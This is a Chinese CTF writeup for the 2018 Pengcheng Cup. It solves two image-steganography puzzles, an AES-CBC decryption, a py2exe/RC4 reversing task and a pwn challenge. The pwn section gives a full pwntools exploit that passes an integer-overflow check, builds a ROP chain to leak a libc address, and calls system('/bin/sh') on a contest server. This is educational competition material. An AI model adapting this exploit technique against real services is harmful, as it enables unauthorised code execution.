---
title: 2018 鹏城杯 CTF 部分解题报告（writeup）
date: 2018-12-02 19:48:21
tags:
- CTF
- 信息安全
- Writeups
---

### 0x0. 前言
最近连续参加了几场 CTF，这算是打得最好的一场了，虽然还是很菜。题目 pwn 比较多，只做出最简单的一道... 总体来说玩得还是很开心。

### 0x1. Misc - Traffic Light - 100 pt
图片隐写题。

给了一个 GIF 图，以为是 LSB 那种套路题，结果不是。文件很大，有 18MB，动画内容是一个红绿灯不停地闪，看了一会儿发现闪的灯有猫腻，并不是简单地随便闪，似乎总是八次红或绿之后闪一次黄，这让我们联想到会不会是红绿色代表一个二进制位，而黄色代表字节之间的分隔。尝试假设绿色代表 0，红色代表 1，对前几次信号灯进行解码，的确可以解出可见字符。接下来就是写脚本自动解码：
```python
from PIL import Image
from PIL import ImageSequence

frames = []
img = Image.open('./Traffic_Light.gif')

ro = 0
yo = 0
go = 0

for frame in ImageSequence.Iterator(img):
	f = frame.copy().convert("RGB")
	r1, g1, b1 = f.getpixel((111,52))
	r2, g2, b2 = f.getpixel((111,102))
	r3, g3, b3 = f.getpixel((111,143))

	if r1 == 255 and g1 == 0 and b1 == 0 and ro == 0:
		ro = 1
		yo = 0
		go = 0
		print('1',end='')
		continue
	if r2 == 255 and g2 == 255 and b2 == 0 and yo == 0:
		ro = 0
		yo = 1
		go = 0
		print(' ',end='')
		continue
	if r3 == 0 and g3 == 255 and b3 == 0 and go == 0:
		ro = 0
		yo = 0
		go = 1
		print('0',end='')
		continue
	ro = 0
	yo = 0
	go = 0
```

![](https://i.loli.net/2018/12/04/5c0692ec3b211.png)

看成 ASCII 码转成字符就是 flag。

![](https://i.loli.net/2018/12/04/5c0692ecd852d.png)

### 0x2. Misc - GreatWall - 200 pt
图片隐写题。

这次是常规套路，用 Stegsolve 打开图片，查看 RGB 通道，发现通道 0 有一道黑条，应该是隐藏了数据。提取出来看看：

![](https://i.loli.net/2018/12/04/5c0692f3064fc.png)

有 Exif 字样，可能是一张图片，先保存成文件。把后缀改成各种图片格式都无法打开，既然有 Exif 信息，就用 ExifTool 看看，说不定有线索。ExifTool 提示文件前面有 8 字节未知头部然后跟着疑似 JPEG 的数据。用十六进制编辑器把文件前 8 字节删掉，然后就可以以 jpg 格式打开了。图片最上面有一行加号、长横、短横的组合，每两个加号之间都是间隔 6 或者 7 个横。加号应该是分隔符，长短横一开始以为是莫尔斯码，但这样分隔的话解码方式不唯一，又想了想，可能是长横代表 1，短横代表 0。手动进行翻译，不足 8 位的在前面补 0，和上一题一样的套路，得到一串二进制，转成字符就是 flag。

![](https://i.loli.net/2018/12/04/5c0692f2ed62a.png)

### 0x3. Crypto - easyCrypto - 200 pt
AES 加密题。

给了密文 `524160f3d098ad937e252494f827f8cf26cc549e432ff4b11ccbe2d8bfa76e5c6606aad5ba17488f11189d41bca45baa` 和一个脚本，里面都帮你注释好了是 AES 加密、数据分组长度 128 bits。看代码也很容易知道加密模式 CBC，初始向量 IV 是 16 字节随机数据。加密部分如下：

```python
	def encrypt(self, plaintext):
        # 生成随机初始向量IV
		iv = Random.new().read(16)
		aes = AES.new(self.key,AES.MODE_CBC,iv)
		prev_pt = iv
		prev_ct = iv
		ct=""

		msg=self.pad(plaintext)
		for block in self.split_by(msg, 16):
			ct_block = self.xor(block, prev_pt)
			ct_block = aes.encrypt(ct_block)
			ct_block = self.xor(ct_block, prev_ct)
			ct += ct_block
			
		return b2a_hex(iv + ct)
```

注意最后一行，返回的密文是 IV 和明文加密结果拼接，说明密文前 16 字节就是 IV。那就很简单了，写解密脚本（网上有几乎一样的，拿来改下就好了）：

```python
[省略原脚本部分]

	def decrypt(self, msg):
		iv, msg = msg[:16], msg[16:]
		aes = AES.new(self.key,AES.MODE_CBC,iv)
		prev_pt = iv
		prev_ct = iv
		ct=""
		for block in self.split_by(msg, 16):
			ct_block = self.xor(block, prev_ct)
			ct_block = aes.decrypt(ct_block)
			ct_block = self.xor(ct_block, prev_pt)
			ct += ct_block
			print(ct_block)
		#return b2a_hex(unpad(ct))

# 测试模块
if __name__ == '__main__':
	#BS = AES.block_size # aes数据分组长度为128 bit
	key="asdfghjkl1234567890qwertyuiopzxc"
	demo = aesdemo(key)
	#e = demo.encrypt(flag)
	msg="524160f3d098ad937e252494f827f8cf26cc549e432ff4b11ccbe2d8bfa76e5c6606aad5ba17488f11189d41bca45baa"
	demo.decrypt(a2b_hex(msg))
```

### 0x4. Pwn - overInt - 100 pt
整数溢出 + ROP 题。

先看看保护，只开了 NX。拖进 IDA，先看 `main()` 函数开头几句，是这样：

![](https://i.loli.net/2018/12/04/5c0692f320ab8.png)

读 4 字节到 `buf` 里，把这 4 字节解释为一个 `int`（注意小尾序），存到 `buf_int` 里。`buf` 其实是指向 `v9` 的指针，而接下来把 `&v8` 传入（其实相当于传的是 `buf`，因为传入的函数里直接跳过了 `v8` 从 `v9` 开始处理）`sub_4007D1` 进行计算，若返回 `35` 程序才继续往下走。

`sub_4007D1` 的计算比较简单，写了个 C 程序来爆破什么样的输入能让其返回 `35`：

```c
#include <stdio.h>

int main() {
	int v3 = 0;
	for (int a=0; a<256;a++)
		for (int b=0;b<256; b++)
			for (int c=0;c<256;c++)
				for (int d=0; d<256;d++) {
					if (a<30 || b<30) continue;
					v3 = 0;
					v3 = ((char)(a >> 4) + 4 * v3) ^ (a << 10);
	                v3 = ((char)(b >> 4) + 4 * v3) ^ (b << 10);
	                v3 = ((char)(c >> 4) + 4 * v3) ^ (c << 10);
	                v3 = ((char)(d >> 4) + 4 * v3) ^ (d << 10);
	                if ((v3 % 47 + (v3 % 47 < 0  ? 47 : 0)) == 35) {
	                	printf("%x\t%x\t%x\t%x\n",a,b,c,d);
					}
				}
}
```

结果有很多组这样的输入，就随便挑一组 `\x1e\x28\x7a\x61` 吧。先用脚本测试一下是不是真的通过了 `35` 的测试：

```python
from pwn import *

context.log_level = 'debug'

#p = process('./overInt')
p = remote('58.20.46.148',35272)

#gdb.attach(p)

def pwn_main():
	p.recvuntil('number: \n')
	p.send('\x1e\x28\x7a\x61')
	
	p.interactive()

pwn_main()
```

测试成功，没有提示 `You get the wrong key!`。

回到 `main()`，接着往下看：

![](https://i.loli.net/2018/12/04/5c0692f2ec98b.png)

先测试 `sub_4006C6` 的返回值是否等于 `v16`，等于才继续运行。再测试 `buf_int + v16` 是否小于等于 `4`，是则继续运行。这里 `v16` 是一个预设值，等于 `0x20633372`。进入 `sub_4006C6` 分析：

![](https://i.loli.net/2018/12/04/5c0692f320e3e.png)

先读 4 字节到 `buf` 里（这个 `buf` 是局部变量，不是刚才那个），将其解释为 `int` 存到 `v5` 中，这个数决定接下来的循环次数。然后如果 `v5 > 4`，进入循环，循环 `v5` 次，每次尝试读取 4 字节到 `buf` 中，如果读到 4 字节，则把这 4 字节解释为 `int` 加到 `v7` 上，如果不足 4 字节就啥都不做，进入下一次循环。最后函数的返回值是 `v7` 的内容，也就是说我们只要让 `v7` 等于 `0x20633372` 就 OK 了，而这只要每次循环中输入的数相加等于它就能做到。循环次数 `v5` 必须大于 4，这里有两种做法：一是第一次输入 `0x20633372`，后面几次输入 `0`，二是第一次输入 `0x20633372`，后面几次输入不足 4 字节。我们采取后者。

```python
	p.recvuntil('have?\n')
	p.send('\x05\x00\x00\x00')
	p.recvuntil('is: \n')
	p.sendline('\x72\x33\x63\x20')
	for _ in range(3):
		p.recvuntil('is: \n')
		p.sendline('\x01\x01')
```

回到 `main()`，接着看下一个检查：测试 `buf_int + v16` 是否小于等于 `4`，是则继续运行。`v16` 是固定的预设值，我们只能通过改变开始输入的 `buf_int` 来满足这一要求，由于二者都是有符号 32 位整数，只要让二者相加溢出绕回到负数即可，我们开头选择的 `\x1e\x28\x7a\x61` 正好满足要求（`0x617a281e` + `0x20633372` <= 4）。

然后进入 `main()` 最后也是最重要的一段逻辑：

![](https://i.loli.net/2018/12/04/5c0692f84e3d6.png)

这也太直白了，直接给了你任意地址写漏洞... 可以想到接下来的事就是常规套路：泄露 libc 地址，查 libc 版本，计算 `system` 和 `/bin/sh` 字符串地址，跳到 `system` 获得 shell。

首先，泄露 libc 地址。程序里有 `puts`，就用它了，调用 `puts(puts_got);` 就能泄露出其真实地址。得解决两个问题：1. 怎么给 `puts` 传参；2. 怎么跳到 `puts`。问题一答案是 ROP，这是 64 位 ELF，用寄存器传参，找到 `pop rdi; ret;` 这样的 gadget，任意地址写把参数写到栈上，跳到 gadget 就可以传参，问题二答案是任意地址写覆盖 `main()` 返回地址。

先把参数写到栈上，参数是 `puts` 的 GOT 表地址，可以用 `objdump` 获得，注意任意地址写写入的地址是 `我们输入的地址 + &v9`，也就是说我们要输入的应该是 v9 到目标地址的距离，这个距离每次运行都是不会变的，动态调试加计算一下就能得出。用 ROPgadget 找到 `0x400b13` 处有 `pop rdi; ret;`，我们先覆盖 `main()` 返回地址，再布置参数，再布置 `puts` 的 PLT 地址，就能实现传参并跳到 `puts`。这部分代码如下：

```python
def write(offset, data):
	p.recvuntil('modify?\n')
	p.send(p32(offset))
	p.recvuntil('write in?\n')
	p.send(data)

p.send('\x15\x00\x00\x00') # 发送要写入的字节总个数
write(0x38, '\x13')
write(0x39, '\x0b')
write(0x3a, '\x40')
write(0x3b, '\x00')
write(0x3c, '\x00')
write(0x3d, '\x00') # gadget 地址
write(0x40, '\x18')
write(0x41, '\x20')
write(0x42, '\x60') # puts_got
write(0x48, '\x50')
write(0x49, '\x05')
write(0x4a, '\x40')
write(0x4b, '\x00')
write(0x4c, '\x00')
write(0x4d, '\x00') # puts_plt
write(0x50, '\x7f')
write(0x51, '\x08')
write(0x52, '\x40')
write(0x53, '\x00')
write(0x54, '\x00')
write(0x55, '\x00') # 跳回 main() 开头再次触发漏洞

p.recvuntil('hello!')
puts_addr = u64(p.recvline().ljust(8,'\x00')) - 0xa000000000000
print 'puts_addr: ' + hex(puts_addr)
```

其次，得到 `puts` 真实地址后，查 libc-database 得知是 glibc 2.23，也可以计算出 `system` 和 `/bin/sh` 地址。最后我们需要回到 `main()` 开头再次触发漏洞，用同样的套路给 `system` 传参，跳到 `system` 就成功了。

最后全部 exp 如下：
```python
from pwn import *

context.log_level = 'debug'

#p = process('./overInt')
p = remote('58.20.46.148',35272)

#gdb.attach(p)

def pwn_main():
	p.recvuntil('number: \n')
	p.send('\x1e\x28\x7a\x61')

	p.recvuntil('have?\n')
	p.send('\x05\x00\x00\x00')
	p.recvuntil('is: \n')
	p.sendline('\x72\x33\x63\x20')
	for _ in range(3):
		p.recvuntil('is: \n')
		p.sendline('\x01\x01')

	p.recvuntil('modify?\n')

def write(offset, data):
	p.recvuntil('modify?\n')
	p.send(p32(offset))
	p.recvuntil('write in?\n')
	p.send(data)

pwn_main()
p.send('\x15\x00\x00\x00')
write(0x38, '\x13')
write(0x39, '\x0b')
write(0x3a, '\x40')
write(0x3b, '\x00')
write(0x3c, '\x00')
write(0x3d, '\x00')
write(0x40, '\x18')
write(0x41, '\x20')
write(0x42, '\x60')
write(0x48, '\x50')
write(0x49, '\x05')
write(0x4a, '\x40')
write(0x4b, '\x00')
write(0x4c, '\x00')
write(0x4d, '\x00')
write(0x50, '\x7f')
write(0x51, '\x08')
write(0x52, '\x40')
write(0x53, '\x00')
write(0x54, '\x00')
write(0x55, '\x00')

p.recvuntil('hello!')
puts_addr = u64(p.recvline().ljust(8,'\x00')) - 0xa000000000000
print 'puts_addr: ' + hex(puts_addr)

binsh_addr = (0x18cd57 - 0x6f690) + puts_addr
sys_addr = (0x45390 - 0x6f690) + puts_addr

pwn_main()
p.send('\x14\x00\x00\x00')

write(0x38, '\x13')
write(0x39, '\x0b')
write(0x3a, '\x40')
write(0x3b, '\x00')
write(0x3c, '\x00')
write(0x3d, '\x00')

print 'binsh_addr: ' + hex(binsh_addr)
print 'sys_addr: ' + hex(sys_addr)

start = 0x40
for _ in range(6):
	write(start, chr(binsh_addr % 0x100))
	binsh_addr = (binsh_addr >> 8)
	start = start + 1

start = 0x48
for _ in range(8):
	write(start, chr(sys_addr % 0x100))
	sys_addr = sys_addr >> 8
	start = start + 1

p.interactive()
```

### 0x5. Reverse - flow - 200 pt
RC4 算法 + 一点简单的排列组合题。

给了一个 exe，跑不起来，提示加载 Python 的 dll 失败，猜测是什么打包器把 py 脚本打包成了 exe，上网搜了一下，大概是 py2exe，有工具可以还原成 py 源码。还原后大致如下（变量名原来是混淆过的，我改了好看一点）：

![](https://i.loli.net/2018/12/04/5c0692f92b65f.png)

主函数把 flag 经过 `CaR_chng` 函数打乱，再交给 `encode` 函数加密，由该函数第一行知加密后字符串的前 16 个字符是字符串 `1234` 的 MD5 值，是固定的，然后再把 `chng` 打乱后的字符串和密钥 MD5 一部分拼接，再传给 `docrypt` 加密，最后密钥 MD5 另一部分和加密结果拼接返回。docrypt 函数多次对 256 取模，怀疑是 RC4 算法，网上找解密脚本即可（网上又有几乎一样的脚本，改改就能用）。

加密后的密文在远程服务器上，`nc` 连过去，会打印一串密文，但密文每次都不同，这是因为在 `chng` 函数中打乱用了时间作为随机数种子。我们随便取一次密文，对其解密。密文为`0036dbd8313ed055NJD5H1Ufzl75Uabahst5fRLfw9ZIivE1QhW9436ZvI101BTq+6q2h0+GdytFg91PmsIoNolhj8r4+Kv+A7awqOMs`。

![](https://i.loli.net/2018/12/04/5c0692f2ec52a.png)

这里可能不是很明显，但做题时对多个密文解密可以发现明显的 `flag{}` 字样，只是顺序被打乱了。那么我们只要对解密后的内容想办法恢复打乱前的顺序就能得到 flag。

分析一下打乱函数 `chng`，先生成 0,1,2,3 的全排列中的随机一个，称为 `perm`，然后对明文做如下变换（称为第一次变换）：1. 把第一个字符放到最后；2. 抽出偶数号字符，和奇数号字符拼接；3. 再次把第一个字符放到最后。接着，把第一次变换后的字符串每4个字符为一组打乱（称为第二次变换），打乱的顺序是 `perm` 的顺序，如字符串 `abcd` 经 `perm: 3012` 打乱后是 `dabc`。对这两个变换重复 100 次，最后得到结果。

上述第一次变换的逆过程很容易写出：
```python
        msg_orig=''
        msg = msg[-1:] + msg[:-1]
        msg_even = msg[:len(msg)/2]
        msg_odd = msg[len(msg)/2:]
        for x in xrange(0,len(msg),2):
            msg_orig = msg_orig + msg_even[x/2] + msg_odd[x/2]
        msg = msg_orig[-1:] + msg_orig[:-1]
```

第二次变换则涉及到随机排列，我们不知道服务器上生成的随机排列是什么。但 0,1,2,3 的全排列只有 4!=24 种，我们可以试遍所有排列，找到能还原出 flag 的那一个。做题时很幸运，试到第三个时就对了。最后的反打乱算法：
```python
def unchng(msg):
    W = 4
    #0123, 0132, 0213, 0231, 0312, 0321,
    #1023, 1032, 1203, 1230, 1302, 1320,
    #2013, 2031, 2103, 2130, 2301, 2310,
    #3012, 3021, 3102, 3120, 3201, 3210
    perm = [0,2,1,3]
    #print msg
    
    for j in xrange(100):
        res = ''
        for i in xrange(0, len(msg), W):
            for msgll in xrange(W):
                res += msg[i:i + W][perm[msgll]]
        #print res
        msg = res
        msg_orig=''
        msg = msg[-1:] + msg[:-1]
        msg_even = msg[:len(msg)/2]
        msg_odd = msg[len(msg)/2:]
        for x in xrange(0,len(msg),2):
            msg_orig = msg_orig + msg_even[x/2] + msg_odd[x/2]
        msg = msg_orig[-1:] + msg_orig[:-1]

return msg
```

调用：
```python
if __name__ == '__main__':
    rc = CaR('sdfgowormznsjx9ooxxx')
    #string = '1234567890'
    #string = CaR_chng(string)
    st = rc.decode('0036dbd8313ed055NJD5H1Ufzl75Uabahst5fRLfw9ZIivE1QhW9436ZvI101BTq+6q2h0+GdytFg91PmsIoNolhj8r4+Kv+A7awqOMs')
    st = unchng(st)
    print st
```

![](https://i.loli.net/2018/12/04/5c0694485f3e0.png)

最后两个点是加密时为了对齐补上去的，提交 flag 时要删掉。